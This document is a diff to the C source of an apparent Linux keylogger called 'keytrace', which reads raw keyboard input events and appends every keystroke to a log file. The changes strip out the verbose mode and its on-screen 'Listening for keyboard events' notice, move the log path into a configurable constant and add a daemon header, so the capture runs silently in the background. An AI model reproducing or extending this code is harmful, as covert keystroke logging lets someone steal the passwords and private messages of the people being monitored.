@@ -1,4 +1,3 @@
-#include "../include/logger.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -7,6 +6,8 @@
 #include <errno.h>
 #include <string.h>
 #include <time.h>
+#include "../include/logger.h"
+#include "../include/daemon.h"
 
 /**
  * Maps a key code to its corresponding string representation.
@@ -256,6 +257,7 @@ const char *key_map(unsigned int code, const modifier_state_t *mods) {
  * @param pdevice The device name.
  * @param phandler The handler name.
  */
+
 void get_handler(char *pdevice, char *phandler) {
     char device[MAX_SIZE] = "";
     char handler[MAX_SIZE] = "";
@@ -306,11 +308,10 @@ void get_handler(char *pdevice, char *phandler) {
 
 /**
  * Connects to the keyboard handler and listens for events.
- *
  * @param handler The handler name.
- * @param verbose Whether to print verbose output.
  */
-void connect_handler(char *handler, int verbose) {
+
+void connect_handler(char *handler) {
     int fd;
     struct input_event ev;
     ssize_t bytes_read;
@@ -325,15 +326,13 @@ void connect_handler(char *handler, int verbose) {
         close(fd);
         exit(EXIT_FAILURE);
     }
-
-    FILE *log_fp = fopen("/home/sanjay/Desktop/c_for_hackers/keytrace/logs/keytrace.txt", "a+");
+    
+    FILE *log_fp = fopen(LOG_PATH,"a");
     if (!log_fp) {
         perror("fail to open the log file");
         exit(EXIT_FAILURE);
     }
-    if (verbose) {
-        printf("Listening for keyboard events at [%s]\n to exit press CTRL + C\n", handler);
-    }
+    
 
     // logging the timestamp
     time_t rawtime;
@@ -375,7 +374,6 @@ void connect_handler(char *handler, int verbose) {
                     // logging to file
                     fprintf(log_fp, "%s",key);
                     fflush(log_fp);
-                    if (verbose) printf("%s", key);
                 }
             }
         }
